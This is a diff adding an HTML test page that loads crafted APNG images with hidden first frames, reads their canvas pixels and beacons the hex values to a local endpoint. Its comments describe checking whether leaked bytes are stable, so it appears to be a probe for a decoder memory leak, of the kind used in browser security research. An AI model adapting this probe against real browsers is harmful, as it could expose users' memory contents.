@@ -1,0 +1,44 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng1</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex(d,i){var s='';for(var k=0;k<4;k++)s+=('0'+d[i*4+k].toString(16)).slice(-2);return s;}
+function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url+'?t='+Date.now(); }); }
+
+function narrow(i){
+  if(!i){ b('A1-NARROW-nodecode'); return; }
+  b('A1-NARROW-dim-'+i.naturalWidth+'x'+i.naturalHeight);
+  var c=document.createElement('canvas'); c.width=64; c.height=1;
+  var g=c.getContext('2d'); g.drawImage(i,0,0);
+  var d=g.getImageData(0,0,64,1).data;
+  b('A1-NARROW-p0-'+hex(d,0)+'-p1-'+hex(d,1)+'-p2-'+hex(d,2));
+  var seen={}, order=[], nz=0;
+  for(var x=0;x<64;x++){ var h=hex(d,x); if(!(h in seen)){seen[h]=0; order.push(h);} seen[h]++; if(d[x*4]||d[x*4+1]||d[x*4+2]) nz++; }
+  b('A1-NARROW-distinct-'+order.length+'-'+order.slice(0,8).join('-'));
+  b('A1-NARROW-nz-'+nz);
+  // second draw on a fresh canvas, to see if the leaked bytes are stable
+  var c2=document.createElement('canvas'); c2.width=64; c2.height=1;
+  var g2=c2.getContext('2d'); g2.drawImage(i,0,0); var d2=g2.getImageData(0,0,64,1).data;
+  var same=1; for(var x=0;x<256;x++) if(d[x]!==d2[x]){ same=0; break; }
+  b('A1-NARROW-stable-'+same);
+}
+
+function offset(i){
+  if(!i){ b('A1-OFFSET-nodecode'); return; }
+  var c=document.createElement('canvas'); c.width=200; c.height=2;
+  var g=c.getContext('2d'); g.drawImage(i,0,0);
+  var d=g.getImageData(0,0,200,2).data;
+  var row0={}, row1={};
+  for(var x=0;x<200;x++){ var a=hex(d,x), e=hex(d,200+x); row0[a]=(row0[a]||0)+1; row1[e]=(row1[e]||0)+1; }
+  b('A1-OFFSET-row0-'+Object.keys(row0).slice(0,4).join('_')+'-row1-'+Object.keys(row1).slice(0,4).join('_'));
+  b('A1-OFFSET-tl-'+hex(d,0)+'-x160y1-'+hex(d,161)+'-x199y1-'+hex(d,200+199));
+}
+
+function boot(){
+  b('A1-BOOT');
+  Promise.all([img('/corpus/apng-hidden-first-frame-narrow.png'), img('/corpus/apng-hidden-first-frame-offset.png')]).then(function(r){
+    try{ narrow(r[0]); }catch(e){ b('A1-NARROW-E-'+e.name); }
+    try{ offset(r[1]); }catch(e){ b('A1-OFFSET-E-'+e.name); }
+    b('A1-DONE');
+  });
+}
+boot();
+</script></head><body><p>apng1</p></body></html>
